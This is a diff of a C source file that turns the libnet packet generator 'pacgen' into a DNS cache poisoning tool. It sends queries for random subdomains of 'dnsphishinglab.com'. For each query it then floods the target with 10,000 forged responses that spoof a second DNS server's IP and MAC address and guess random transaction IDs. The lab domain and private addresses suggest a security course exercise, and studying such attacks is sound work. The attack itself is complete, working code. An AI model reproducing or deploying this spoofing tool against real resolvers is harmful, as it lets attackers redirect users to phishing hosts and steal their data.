@@ -15,87 +15,95 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <time.h>
+int c;
+u_char *cp;
+libnet_t *l;
+libnet_ptag_t t;
+char errbuf[LIBNET_ERRBUF_SIZE];
+int tries_domain = 100;
+int tries_per_domain = 10000;
 
-    int c;
-    u_char *cp;
-    libnet_t *l;
-    libnet_ptag_t t;
-    char errbuf[LIBNET_ERRBUF_SIZE];
-    
-    char eth_file[FILENAME_MAX] = "";
-    char ip_file[FILENAME_MAX] = "";
-    char tcp_file[FILENAME_MAX] = "";
-    char payload_file[FILENAME_MAX] = "";
-    char *payload_location;
-    
-    int x;
-    int y = 0;
-    int udp_src_port = 1;       /* UDP source port */
-    int udp_des_port = 1;       /* UDP dest port */
-    int z;
-    int i;
-    int payload_filesize = 0;
+char eth_file[FILENAME_MAX] = "";
+char ip_file[FILENAME_MAX] = "";
+char tcp_file[FILENAME_MAX] = "";
+char payload_file[FILENAME_MAX] = "";
+char dev[] = "eth12";
 
-    int t_src_port;		/* TCP source port */
-    int t_des_port;		/* TCP dest port */
-    int t_win;		/* TCP window size */
-    int t_urgent;		/* TCP urgent data pointer */
-    int i_id;		/* IP id */
-    int i_frag;		/* IP frag */
-    u_short head_type;          /* TCP or UDP */
+//char payload_file[] = "dns_query_payload";
+char *payload_location;
+char attack_domain[] = "dnsphishinglab.com"; // domain name to attack dnsphishinglab.com
+char random_host[50];
+char dns_bind2_addr[] = "10.0.2.6"; // second DNS server ip.
+u_char res_eth_saddr[6]; // spoofing the source MAC to be same as the second DNS server.
 
-    u_long t_ack;		/* TCP ack number */
-    u_long t_seq;		/* TCP sequence number */
-    u_long i_des_addr;		/* IP dest addr */
-    u_long i_src_addr;		/* IP source addr */
+int x;
+int y = 0;
+int udp_src_port = 1;       /* UDP source port */
+int udp_des_port = 1;       /* UDP dest port */
+int z;
+int i;
+int payload_filesize = 0;
 
-    u_char i_ttos[90];		/* IP TOS string */
-    u_char t_control[65];	/* TCP control string */
+int t_src_port;		/* TCP source port */
+int t_des_port;		/* TCP dest port */
+int t_win;		/* TCP window size */
+int t_urgent;		/* TCP urgent data pointer */
+int i_id;		/* IP id */
+int i_frag;		/* IP frag */
+u_short head_type;          /* TCP or UDP */
 
-    u_char eth_saddr[6];	/* NULL Ethernet saddr */
-    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
-    u_char eth_proto[60];       /* Ethernet protocal */
-    int eth_pktcount;        /* How many packets to send */
-    int nap_time;              /* How long to sleep */
 
-    u_char ip_proto[40];
+u_long t_ack;		/* TCP ack number */
+u_long t_seq;		/* TCP sequence number */
+u_long i_des_addr;		/* IP dest addr */
+u_long i_src_addr;		/* IP source addr */
+u_long i_dns_bind2_addr;
 
-    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
-    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};
+u_char i_ttos[90];		/* IP TOS string */
+u_char t_control[65];	/* TCP control string */
 
-    u_char *device = NULL;
-    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
-    u_char t_control_val = 0;	/* final or'd value for tcp control */
-    int i_ttl;		/* IP TTL */
-    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
-    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */
+u_char eth_saddr[6];	/* NULL Ethernet saddr */
+u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
+u_char eth_proto[60];       /* Ethernet protocal */
+int eth_pktcount;        /* How many packets to send */
+int nap_time;              /* How long to sleep */
 
-int
-main(int argc, char *argv[])
+u_char ip_proto[40];
+
+u_char spa[4]={0x0, 0x0, 0x0, 0x0};
+u_char tpa[4]={0x0, 0x0, 0x0, 0x0};
+
+u_char *device = NULL;
+u_char i_ttos_val = 0;	/* final or'd value for ip tos */
+u_char t_control_val = 0;	/* final or'd value for tcp control */
+int i_ttl;		/* IP TTL */
+u_short e_proto_val = 0;    /* final resulting value for eth_proto */
+u_short ip_proto_val = 0;   /* final resulting value for ip_proto */
+
+int main(int argc, char *argv[])
 {
+    if (argc < 5){
+         fprintf(stderr, "Usage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
+         exit(1);
+    }
     /*
      *  Initialize the library.  Root priviledges are required.
      */
 
     l = libnet_init(
-            LIBNET_LINK,                             /* injection type */
-            NULL,                                    /* network interface eth0, eth1, etc. NULL is default.*/
-	  //  "eth0",                                /* network interface eth0, eth1, etc. NULL is default.*/
-            errbuf);                                 /* error buffer */
+        LIBNET_LINK,                             /* injection type */
+	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
+        errbuf);                                 /* error buffer */
 
     if (l == NULL)
     {
         fprintf(stderr, "libnet_init() failed: %s", errbuf);
         exit(EXIT_FAILURE); 
+    }else{
+        fprintf(stderr, "libnet_init() succeed. \n");
     }
-	
-/*  src_ip  = 0;
-    dst_ip  = 0;
-    src_prt = 0;
-    dst_prt = 0;
-    payload = NULL;
-    payload_s = 0;
-*/
+
     while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
     {
         switch (c)
@@ -119,180 +127,222 @@ main(int argc, char *argv[])
 
     if (optind != 9)
     {    
-        usage();
         exit(0);
     }
     
-    load_payload();
-    load_ethernet();
-    load_tcp_udp();
-    load_ip();
-    convert_proto();
+    i_dns_bind2_addr = libnet_name2addr4(l, dns_bind2_addr, LIBNET_RESOLVE);
+    sscanf("08, 00, 27, 5a, 7c, 7c", "%x, %x, %x, %x, %x, %x", &res_eth_saddr[0], &res_eth_saddr[1], &res_eth_saddr[2], &res_eth_saddr[3], &res_eth_saddr[4], &res_eth_saddr[5]);
 
-/*    Testing tcp header options
+    srand((int)time(0));
+    int ireq = 0;
+    while (ireq++ < tries_domain) {
+        int randomNumber = (rand()%10000000);
+        while (randomNumber<1000000) randomNumber*=10;
+        sprintf(random_host, ".x-%d.%s", randomNumber,attack_domain);
+        printf("\nNow attacking with domain %s \n",random_host);
+        convertDomain();
 
-        t = libnet_build_tcp_options(
-        "\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000",
-        20,
-        l,
-        0);
-    if (t == -1)
-    {
-        fprintf(stderr, "Can't build TCP options: %s\n", libnet_geterror(l));
-        goto bad;
-    }
-*/
+        // load_payload();
+        load_payload_query(); // get the new payload with random subdomain
+        load_ethernet();
+        load_tcp_udp();
+        load_ip();
+        convert_proto();
 
-if(ip_proto_val==IPPROTO_TCP){    
-    t = libnet_build_tcp(
-        t_src_port,                                    /* source port */
-        t_des_port,                                    /* destination port */
-        t_seq,                                         /* sequence number */
-        t_ack,                                         /* acknowledgement num */
-        t_control_val,                                 /* control flags */
-        t_win,                                         /* window size */
-        0,                                             /* checksum */
-        t_urgent,                                      /* urgent pointer */
-        LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
-	payload_location,                              /* payload */
-        payload_filesize,                              /* payload size */
-        l,                                             /* libnet handle */
-        0);                                            /* libnet id */
-    head_type = LIBNET_TCP_H;
-    if (t == -1)
-    {
-        fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
-        goto bad;
-    }
-}
+        if(ip_proto_val==IPPROTO_TCP){    
+            t = libnet_build_tcp(
+                t_src_port,                                    /* source port */
+                t_des_port,                                    /* destination port */
+                t_seq,                                         /* sequence number */
+                t_ack,                                         /* acknowledgement num */
+                t_control_val,                                 /* control flags */
+                t_win,                                         /* window size */
+                0,                                             /* checksum */
+                t_urgent,                                      /* urgent pointer */
+                LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
+            payload_location,                              /* payload */
+                payload_filesize,                              /* payload size */
+                l,                                             /* libnet handle */
+                0);                                            /* libnet id */
+            head_type = LIBNET_TCP_H;
+            if (t == -1)
+            {
+                fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
+                goto bad;
+            }
+        }
  
-if(ip_proto_val==IPPROTO_UDP){
-        t = libnet_build_udp(
-	    t_src_port,                                /* source port */
-	    t_des_port,                                /* destination port */
-	    LIBNET_UDP_H + payload_filesize,           /* packet length */
-	    0,                                         /* checksum */
-	    payload_location,                          /* payload */
-	    payload_filesize,                          /* payload size */
-	    l,                                         /* libnet handle */
-	    0);                                        /* libnet id */
-    head_type = LIBNET_UDP_H;
-    if (t == -1)
-    {
-        fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
-        goto bad;
+        if(ip_proto_val==IPPROTO_UDP){
+                t = libnet_build_udp(
+                t_src_port,                                /* source port */
+                t_des_port,                                /* destination port */
+                LIBNET_UDP_H + payload_filesize,           /* packet length */
+                0,                                         /* checksum */
+                payload_location,                          /* payload */
+                payload_filesize,                          /* payload size */
+                l,                                         /* libnet handle */
+                0);                                        /* libnet id */
+            head_type = LIBNET_UDP_H;
+            if (t == -1)
+            {
+                fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
+                goto bad;
+            }
+        }
+
+
+        t = libnet_build_ipv4(
+    /*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
+            LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
+            i_ttos_val,                                            /* TOS */
+            i_id,                                                  /* IP ID */
+            i_frag,                                                /* IP Frag */
+            i_ttl,                                                 /* TTL */
+            ip_proto_val,                                          /* protocol */
+            0,                                                     /* checksum */
+            i_src_addr,                                            /* source IP */
+            i_des_addr,                                            /* destination IP */
+            NULL,                                                  /* payload */
+            0,                                                     /* payload size */
+            l,                                                     /* libnet handle */
+            0);                                                    /* libnet id */
+        if (t == -1)
+        {
+            fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
+            goto bad;
+        }
+
+        t = libnet_build_ethernet(
+            eth_daddr,                                   /* ethernet destination */
+            eth_saddr,                                   /* ethernet source */
+            e_proto_val,                                 /* protocol type */
+            NULL,                                        /* payload */
+            0,                                           /* payload size */
+            l,                                           /* libnet handle */
+            0);                                          /* libnet id */
+        if (t == -1)
+        {
+            fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
+            goto bad;
+        }
+         /* 
+         *  Write it to the wire.
+         */
+        c = libnet_write(l);
+        // sending the request to the DNS server
+        free(payload_location);
+        libnet_destroy(l);
+        // reinit the handle so that we can set new parameters to the handle.
+
+        fprintf(stderr, "sending fake responses\n");
+        clock_t t_start = clock();
+        for (i=0; i<tries_per_domain; i++) { // loop to send 10000 responses for each request.
+            l = libnet_init(
+                LIBNET_LINK,                             /* injection type */
+                // NULL,                                    /* network interface eth0, eth1, etc. NULL is default.*/
+                "eth12",                                /* network interface eth0, eth1, etc. NULL is default.*/
+                errbuf);                                 /* error buffer */
+
+            // reinit the handle for sending responses
+            if (l == NULL)
+            {
+                fprintf(stderr, "libnet_init() failed: %s", errbuf);
+                exit(EXIT_FAILURE); 
+            }
+
+            //fprintf(stderr, "loading\n");
+            load_payload_answer();
+            // generate the response and send it
+
+            // change the ports of source port and destination port to match the second DNS query
+            // fprintf(stderr, "udp\n");
+            if(ip_proto_val==IPPROTO_UDP){
+                    t = libnet_build_udp(
+                    t_des_port,                                /* source port */
+                    t_src_port,                                /* destination port */
+                    LIBNET_UDP_H + payload_filesize,           /* packet length */
+                    0,                                         /* checksum */
+                    payload_location,                          /* payload */
+                    payload_filesize,                          /* payload size */
+                    l,                                         /* libnet handle */
+                    0);                                        /* libnet id */
+                head_type = LIBNET_UDP_H;
+                if (t == -1)
+                {
+                    fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
+                    goto bad;
+                }
+            }
+
+            // fprintf(stderr, "ipv4\n");
+            // change the ethernet headers to match the response from the second DNS server
+            t = libnet_build_ipv4(
+             /*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
+                LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
+                i_ttos_val,                                            /* TOS */
+                i_id,                                                  /* IP ID */
+                i_frag,                                                /* IP Frag */
+                i_ttl,                                                 /* TTL */
+                ip_proto_val,                                          /* protocol */
+                0,                                                     /* checksum */
+                i_dns_bind2_addr,                                            /* source IP */
+                i_des_addr,                                            /* destination IP */
+                NULL,                                                  /* payload */
+                0,                                                     /* payload size */
+                l,                                                     /* libnet handle */
+                0);                                                    /* libnet id */
+            if (t == -1)
+            {
+                fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
+                goto bad;
+            }
+
+            //fprintf(stderr, "ethernet\n");
+            t = libnet_build_ethernet(
+                eth_daddr,                                   /* ethernet destination */
+                res_eth_saddr,                                   /* ethernet source */
+                e_proto_val,                                 /* protocol type */
+                NULL,                                        /* payload */
+                0,                                           /* payload size */
+                l,                                           /* libnet handle */
+                0);                                          /* libnet id */
+            if (t == -1)
+            {
+                fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
+                goto bad;
+            }
+             /* 
+             *  Write it to the wire.
+             */
+            //fprintf(stderr, "write\n");
+            c = libnet_write(l);
+            //printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
+            free(payload_location);
+            libnet_destroy(l);
+        }
+        fprintf(stderr, "I sent %d fake DNS responses in %f seconds\n", tries_per_domain, (double)(clock()-t_start)/CLOCKS_PER_SEC);
+        l = libnet_init(
+            LIBNET_LINK,                             /* injection type */
+            dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
+            errbuf);                                 /* error buffer */
+
+        if (l == NULL)
+        {
+            fprintf(stderr, "libnet_init() failed: %s", errbuf);
+            exit(EXIT_FAILURE); 
+        }
+
     }
-}
-
-
-    t = libnet_build_ipv4(
-/*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
-        LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
-	i_ttos_val,                                            /* TOS */
-        i_id,                                                  /* IP ID */
-        i_frag,                                                /* IP Frag */
-        i_ttl,                                                 /* TTL */
-        ip_proto_val,                                          /* protocol */
-        0,                                                     /* checksum */
-        i_src_addr,                                            /* source IP */
-        i_des_addr,                                            /* destination IP */
-        NULL,                                                  /* payload */
-        0,                                                     /* payload size */
-        l,                                                     /* libnet handle */
-        0);                                                    /* libnet id */
-    if (t == -1)
-    {
-        fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
-        goto bad;
-    }
-
-    t = libnet_build_ethernet(
-        eth_daddr,                                   /* ethernet destination */
-        eth_saddr,                                   /* ethernet source */
-        e_proto_val,                                 /* protocol type */
-        NULL,                                        /* payload */
-        0,                                           /* payload size */
-        l,                                           /* libnet handle */
-        0);                                          /* libnet id */
-    if (t == -1)
-    {
-        fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
-        goto bad;
-    }
-     /*	
-     *  Write it to the wire.
-     */
-
-if (nap_time >= 0)
-	printf("You have chosen to send %d packets every %d seconds. \nYou will need to press CTRL-C to halt this process.\n", eth_pktcount, nap_time);
-
-if (nap_time == -1)
-	printf("You have chose to send %d packets and quit.\n",eth_pktcount);
-	
-for(z=0;y<100;z++)  /* setup fake loop to begin infinit loop. This is on purpose because I'm a moron. :-) */
-  {
-   for(x=0;x < eth_pktcount;x++) /* Nested packet count loop */
-     {
-     c = libnet_write(l);
-     }
-     if (nap_time == -1){
-	     y=999;
-	     nap_time = 0;
-      }
-     sleep(nap_time);         /*Pause of this many seconds then loop again*/
-     z=1;
-      }
-
-printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
-
     /* give the buf memory back */
-
+    // clear memory 
     libnet_destroy(l);
     return 0;
 bad:
     libnet_destroy(l);
     return (EXIT_FAILURE);
-	    
+
+// clear memory on failure
 }
-
-usage()
-{
-    fprintf(stderr, "pacgen 1.10 by Bo Cato. Protected under GPL.\nusage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
-}
-
-    /* load_payload: load the payload into memory */
-load_payload()
-{
-    FILE *infile;
-    struct stat statbuf;
-    int i = 0;
-    int c = 0;
-
-    /* get the file size so we can figure out how much memory to allocate */
- 
-    stat(payload_file, &statbuf);
-    payload_filesize = statbuf.st_size;
-
-    payload_location = (char *)malloc(payload_filesize * sizeof(char));
-    if (payload_location == 0)
-    {
-        printf("Allocation of memory for payload failed.\n");
-        exit(0); 
-    }
-
-    /* open the file and read it into memory */
-
-    infile = fopen(payload_file, "r");	/* open the payload file read only */
-    
-    while((c = getc(infile)) != EOF)
-    {
-        *(payload_location + i) = c;
-        i++;
-    }
-
-    fclose(infile);
-}
-
     /* load_ethernet: load ethernet data file into the variables */
 load_ethernet()
 {
@@ -449,5 +499,101 @@ convert_toscontrol()
     if(strstr(i_ttos, "iptos_mincost") != NULL)
         i_ttos_val = i_ttos_val | IPTOS_MINCOST;
 }
+
+convertDomain() {
+    // setting the starting random string
+    unsigned int len = (unsigned)strlen(random_host);
+    int i = 0;
+    while (len>0) {
+        if (random_host[len-1]=='.') {
+            random_host[len-1]=i;
+            i=0;
+        }
+        else {
+            i++;
+        }
+        len--;
+    }
+}
+
+load_payload_query()
+{
+    FILE *infile;
+    struct stat statbuf;
+    int i = 0;
+    int c = 0;
+    int j = 0;
+    /* get the file size so we can figure out how much memory to allocate */
+ 
+    stat(payload_file, &statbuf);
+    unsigned int len = (unsigned)strlen(random_host);
+    payload_filesize = statbuf.st_size + len;
+    payload_location = (char *)malloc(payload_filesize * sizeof(char));
+    if (payload_location == 0)
+    {
+        printf("Allocation of memory for payload failed.\n");
+        exit(0); 
+    }
+
+    /* open the file and read it into memory */
+    // same as most of the pacgen file except for adding the 12 characters for the domain name
+    infile = fopen(payload_file, "r"); /* open the payload file read only */
+    
+    while((c = getc(infile)) != EOF)
+    {
+        *(payload_location + i) = c;
+        i++;
+    }
+    i = 12;
+    for (j=0;j<len;j++) {
+        *(payload_location + i + j) = random_host[j];
+    }
+    fclose(infile);
+}
+
+load_payload_answer()
+{
+    FILE *infile;
+    struct stat statbuf;
+    int i = 0;
+    int c = 0;
+    int j = 0;
+    /* get the file size so we can figure out how much memory to allocate */
+    char payload_file[] = "dns_rsp_payload";
+    int transID[] = {rand()%256,rand()%256};
+
+    stat(payload_file, &statbuf);
+    unsigned int len = (unsigned)strlen(random_host);
+    payload_filesize = statbuf.st_size + len;
+    payload_location = (char *)malloc(payload_filesize * sizeof(char));
+    if (payload_location == 0)
+    {
+        printf("Allocation of memory for payload failed.\n");
+        exit(0); 
+    }
+
+    /* open the file and read it into memory */
+
+    infile = fopen(payload_file, "r"); /* open the payload file read only */
+    //fprintf(stderr, "%d\n", payload_filesize);
+    while((c = getc(infile)) != EOF)
+    {
+        *(payload_location + i) = c;
+        i++;
+    }
+    i = 12;
+    for (j=0;j<len;j++) {
+        *(payload_location + i + j) = random_host[j];
+    }
+    i = 46;
+    for (j=0;j<len;j++) {
+        *(payload_location + i + j) = random_host[j];
+    }
+    // replacing the transaction id in starting to random number
+    *payload_location = transID[0];
+    *(payload_location+1) = transID[1];
+    fclose(infile);
+}
+
 
 /* EOF */
